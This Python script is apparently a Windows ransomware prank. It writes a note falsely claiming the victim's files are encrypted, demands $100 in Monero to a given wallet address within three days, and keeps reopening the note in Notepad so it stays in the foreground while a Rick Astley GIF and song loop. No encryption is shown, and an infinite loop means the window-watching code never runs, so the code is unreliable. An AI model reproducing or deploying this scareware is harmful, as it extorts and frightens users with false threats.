import subprocess
from time import sleep
import win32gui
from playsound import playsound


def rickroll():
    while True:
        gif = subprocess.Popen('rickroll-roll.gif', stdout=subprocess.PIPE, shell=True)
        playsound('rickroll.mp3')
        sleep(5)
        gif.kill()


def ransom_note():
    with open('Rick.txt', 'w', encoding='utf-8') as f:
        f.write(f'''
YOUR FILES HAVE BEEN RICK RANSOMED!!!

TO DECRYPT YOUR FILES SEND THE EQUIVALENT OF $100 IN THE FORM OF MONERO (XMR) TO THIS ADDRESS:
ADDR: 461f9yBS6k7Eyessvv2WC7RQDJhSNr6Rf9EghghA9A7j7xDKhqaquS2YMpCg4wQo3kWSbrsvppXeeaMGmRP3JSCR21pNrz4

YOU HAVE 3 DAYS TO PAY THE FEE BEFORE THE KEY IS DELETED! ONCE THIS HAPPENS YOUR FILES WILL REMAIN 
PERMANENTLY ENCRYPTED! 
THE TIMER HAS ALREADY STARTED SO HURRY UP!!!!!!!!!

Much Love,

- Rick Astley ;) <3

#####################################################################################################
''')


# open ransom note
def show_ransom_note():
    # Open the ransom note
    ransom = subprocess.Popen(['notepad.exe', 'Rick.txt'])
    rickroll()
    count = 0  # Debugging/Testing
    while True:
        sleep(0.1)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if top_window == 'Rick - Notepad':
            print('Ransom note is the top window - do nothing')  # Debugging/Testing
            pass
        else:
            print('Ransom note is not the top window - kill/create process again')  # Debugging/Testing
            # Kill ransom note so we can open it again and make sure ransom note is in ForeGround (top of all windows)
            sleep(0.1)
            ransom.kill()
            # Open the ransom note
            sleep(0.1)
            ransom = subprocess.Popen(['notepad.exe', 'Rick.txt'])
            rickroll()
        # sleep for 10 seconds
        sleep(10)
        count += 1
        if count == 5:
            break


try:
    ransom_note()
except:
    pass
show_ransom_note()

rickroll()
